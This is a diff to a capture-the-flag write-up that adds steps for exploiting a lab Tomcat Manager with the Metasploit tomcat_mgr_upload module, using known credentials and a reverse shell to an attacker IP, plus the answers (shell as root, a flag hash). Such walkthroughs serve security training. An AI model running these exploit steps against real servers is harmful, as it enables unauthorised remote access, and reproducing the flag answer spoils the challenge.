@@ -66,20 +66,40 @@ nikto -h http://10.10.148.25:80 -id bob:bubbles
 
 <span style="line-height:0.5;">&nbsp;</span>
 
-Use Metasploit to exploit the service and get a shell on the system.
+[Metasploit](https://www.metasploit.com/) can be used to exploit Tomcat Manager vulnerabilities using the tomcat_mgr_upload exploit module.
+
+Run Metasploit:
 ```BASH
+msfconsole
 ```
 
-<span style="line-height:0.5;">&nbsp;</span>
+Use exploit module:
+```BASH
+use exploit/multi/http/tomcat_mgr_upload
+```
+
+Set required options:
+```BASH
+set RHOSTS 10.10.148.25
+set LHOST 10.10.168.110
+set RPORT 1234
+set LPORT 4444
+set HttpPassword bubbles
+set HttpUsername bob
+```
+
+Use run command
+```BASH
+run
+```
+![image](https://github.com/user-attachments/assets/6a2e44af-f51c-428b-92f1-0102727b9083)
 
 What user did you get a shell as?
-```BASH
-```
-
-<span style="line-height:0.5;">&nbsp;</span>
+![image](https://github.com/user-attachments/assets/acef8c06-b490-4770-a858-57f3e6d61995)
+<pre>root</pre>
 
 What flag is found in the root directory?
-```BASH
-```
+![image](https://github.com/user-attachments/assets/07afa7ce-89c5-4e39-9836-a0c178651576)
+<pre>ff1fc4a81affcc7688cf89ae7dc6e0e1</pre>
 
 
